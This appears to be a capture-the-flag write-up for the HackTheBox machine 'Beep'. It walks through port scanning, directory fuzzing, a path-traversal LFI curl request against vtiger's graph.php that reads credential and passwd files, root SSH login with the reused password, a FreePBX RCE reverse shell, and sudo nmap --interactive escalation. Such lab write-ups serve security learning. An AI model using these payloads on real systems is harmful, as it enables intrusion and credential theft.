![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b29f00cf-9e62-4267-bb96-702a671f8a8a)

https://app.hackthebox.com/machines/Beep

## Enumeration:

I started by running a quick rustscan to scan the machine for open ports and their services.

```bash
sudo rustscan -a 10.10.10.7 -- -sC -sV -vv -oN beep_nmap
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3c4dbc21-7d0e-4f84-a85f-5f47aaf6cf9c)

```Rust
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68=
|   2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw==
25/tcp    open  smtp       syn-ack ttl 63 Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: AUTH-RESP-CODE APOP PIPELINING STLS IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) TOP UIDL RESP-CODES EXPIRE(NEVER) USER
111/tcp   open  rpcbind    syn-ack ttl 63 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: IMAP4 ATOMIC QUOTA LITERAL+ RIGHTS=kxte OK RENAME ANNOTATEMORE X-NETSCAPE LIST-SUBSCRIBED UIDPLUS NO SORT=MODSEQ BINARY UNSELECT SORT LISTEXT THREAD=ORDEREDSUBJECT IDLE CONDSTORE CATENATE URLAUTHA0001 THREAD=REFERENCES Completed NAMESPACE MAILBOX-REFERRALS CHILDREN ACL ID IMAP4rev1 STARTTLS MULTIAPPEND
443/tcp   open  ssl/http   syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS))
|_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-04-07T08:22:08
| Not valid after:  2018-04-07T08:22:08
| MD5:   621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8
| SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f
| -----BEGIN CERTIFICATE-----
| MIIEDjCCA3egAwIBAgICfVUwDQYJKoZIhvcNAQEFBQAwgbsxCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIEwlTb21lU3RhdGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQK
| ExBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MR4wHAYDVQQDExVsb2NhbGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0B
| CQEWGnJvb3RAbG9jYWxob3N0LmxvY2FsZG9tYWluMB4XDTE3MDQwNzA4MjIwOFoX
| DTE4MDQwNzA4MjIwOFowgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh
| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u
| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh
| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
| LmxvY2FsZG9tYWluMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3e4HhLYPN
| gwJ4eKlW/UpmemPfK/a3mcafSqx/AJP34OC0Twj/cZNaqFPLOWfNjcq4mmiV++9a
| oJCkj4apDkyICI1emsrPaRdrlA/cCXcn3nupfOgcfpBV4vqNfqorEqpJCO7T4bcp
| Z6YHuxtRtP7gRJiE1ytAFP2jDvtvMqEWkwIDAQABo4IBHTCCARkwHQYDVR0OBBYE
| FL/OLJ7hJVedlL5Gk0fYvo6bZkqWMIHpBgNVHSMEgeEwgd6AFL/OLJ7hJVedlL5G
| k0fYvo6bZkqWoYHBpIG+MIG7MQswCQYDVQQGEwItLTESMBAGA1UECBMJU29tZVN0
| YXRlMREwDwYDVQQHEwhTb21lQ2l0eTEZMBcGA1UEChMQU29tZU9yZ2FuaXphdGlv
| bjEfMB0GA1UECxMWU29tZU9yZ2FuaXphdGlvbmFsVW5pdDEeMBwGA1UEAxMVbG9j
| YWxob3N0LmxvY2FsZG9tYWluMSkwJwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9z
| dC5sb2NhbGRvbWFpboICfVUwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOB
| gQA+ah2n+bomON94KgibPEVPpmW+8N6Sq3f4qDG54urTnPD39GrYHvMwA3B2ang9
| l3zta5tXYAVj22kiNM2si4bOMQsa6FZR4AEzWCq9tZS/vTCCRaT79mWj3bUvtDkV
| 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-07-31T18:34:18+00:00; +1s from scanner time.
878/tcp   open  status     syn-ack ttl 63 1 (RPC #100024)
993/tcp   open  ssl/imap   syn-ack ttl 63 Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d
3306/tcp  open  mysql      syn-ack ttl 63 MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      syn-ack ttl 63 Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp? syn-ack ttl 63
4559/tcp  open  hylafax    syn-ack ttl 63 HylaFAX 4.3.10
5038/tcp  open  asterisk   syn-ack ttl 63 Asterisk Call Manager 1.1
10000/tcp open  http       syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
```

The scan revealed multiple open ports, so I decided to begin my enumeration with the web server hosted on ports 80 and 443.

Port 80 redirected all traffic to HTTPS at https://10.10.10.7. When I accessed the website, I found an Elastix application that required authentication:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/38793ce7-da82-4b54-86e8-981844a61c01)

### Fuzzing:

After confirming that the web server is running on port 443, I decided to perform sub-directory enumeration using GoBuster to discover any hidden directories. The GoBuster scan revealed multiple sub-directories on the web server:

```bash
gobuster dir -u https://10.10.10.7/ -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o beep_web -b 404,403 -k
```
```Rust
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]
/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/]
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
/vtigercrm            (Status: 301) [Size: 313] [--> https://10.10.10.7/vtigercrm/]
```

Among the discovered sub-directories, the "/admin" directory caught my attention as it revealed the backend application with version "FreePBX 2.8.1.4":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3e3c9f48-7807-4331-9982-e3315ce7cb7d)

Another interesting discovery was the "Vtiger CRM 5.1.0" running on "/vtigercrm":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/444a6c4f-aaa6-4123-96fe-0be67220ef73)

There was also "FreePBX 2.5" running on the "/recordings" directory:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/94f5237b-0599-4882-a56e-88fac5daf267)

After checking all the web directories, I proceeded to search for exploits related to Elastix on the searchsploit database. I found a few results:

```bash
searchsploit Elastix
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4d4d3aa8-ba1d-401b-8b1c-bb599af1edb5)

Since the first three exploits were related to XSS and I still hadn't authenticated, I chose the third exploit from the results, "Elastix 2.2.0 - 'graph.php' Local File Inclusion," and downloaded it:

```bash
searchsploit -m php/webapps/37637.pl
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dc8aaeaa-6523-47ad-bb89-1839b902ba2f)

I checked the script content and found the Proof of Concept (POC) in the comments of the script:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/247a864a-a960-406b-a3ec-c81713476da6)

So, basically the vulnerability exists in the Vtiger CRM. To exploit the vulnerability, I manually queried the vulnerable path using curl and received a response:

```bash
curl -k -vv 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7e909688-ff22-4c9f-a610-a8ed5749062b)

Since the result was too large to display in the terminal, I queried the same URL in the browser for better view and found multiple credentials present in the "amportal.conf" file:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7151713b-f893-4144-b60e-b707e67e10c3)

I also checked the "/etc/passwd" file and found a user named "fanis" in it.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e175f570-461b-4b15-ae39-54462adbc19d)

## User flag:

By using the same logic, I changed the directory to "/home/fanis/user.txt" and successfully retrieved the user flag. However, I realized that this might not be the intended way to fetch the flag, as I still didn't have shell access.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/74dff33a-c861-4b17-863a-d8ae6a96f43e)

To proceed the intended way, I utilized the credentials I extracted from "/etc/amportal.conf" by exploiting the LFI vulnerability. Using the admin credentials, I successfully logged into various applications:

- https://10.10.10.7/admin/
- https://10.10.10.7/vtigercrm
- https://10.10.10.7/recordings
- https://10.10.10.7/index.php

### Root Method-1:

As I was able to login to multiple services using the same credentials, I thought of trying the same credentials for SSH login as well. Since the password belongs to the admin user, I tried using the same password for the root account.

Initially, I faced some difficulty while connecting via SSH, so I added some extra options while connecting, and with the same password, I was successfully logged in as the root user. (pwn3d!🙂)

```bash
ssh root@10.10.10.7 -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b3dfa059-c78f-40df-ae3a-bbdb94fdf4a9)

### Method 2:

Since the Elastix application is running the vulnerable version, and I now have the credentials for authentication, I can try the "FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution" exploit.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/1fe8ec7d-44ad-4747-b3a6-ba45d22d8d6a)

To proceed, I downloaded the script and made the necessary changes according to my requirements:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/73b33a29-bba7-4492-a429-d55111028b93)

I updated the rhost and lhost values, and for the extension part, I found the extension number as 233 from the website:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/df8f2095-5ba7-4992-8c11-e11b9ab3645c)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5e4c464b-ac65-4c95-9925-0163d3d0950e)

After making all the necessary changes and executing the script, I got a reverse shell in my netcat listener as the user "asterisk".

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/07e94a11-63c8-4572-81cc-58449bec80a7)

With this shell, I started with manual enumeration and checked the sudo permissions:

```bash
sudo -l
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/92c0503b-45f1-4cdf-90f7-a63bdc11f637)

I found that I can run multiple commands as sudo without entering a password. So, I quickly referred to GTFObins and checked for nmap.

Using nmap, I ran these 2 commands and obtained a shell as the root user. (pwn3d!🙂)

```bash
sudo nmap --interactive
nmap> !sh
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ceb1ebae-0545-4714-9ad3-0d97d39dfafa)
